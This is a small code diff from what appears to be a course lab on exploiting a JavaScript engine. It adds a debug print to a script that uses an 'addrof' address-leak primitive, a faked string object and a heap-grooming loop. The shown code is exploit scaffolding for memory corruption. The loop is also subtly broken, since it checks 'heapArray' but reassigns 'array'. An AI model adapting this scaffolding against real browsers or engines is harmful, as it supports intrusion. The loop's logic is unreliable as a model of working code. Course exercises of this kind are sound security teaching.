@@ -13,6 +13,9 @@ let heapArray = new Uint32Array(72);
 while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(heapArray) > cs361s.addrof(fakedStr) - 72 + 16 + 10000000) {
     array = new Uint32Array(72);
 }
+
+print('Here');
+
 let testing = function(){
     print('Test');
     print(cs361s.addrof(fakedStr));
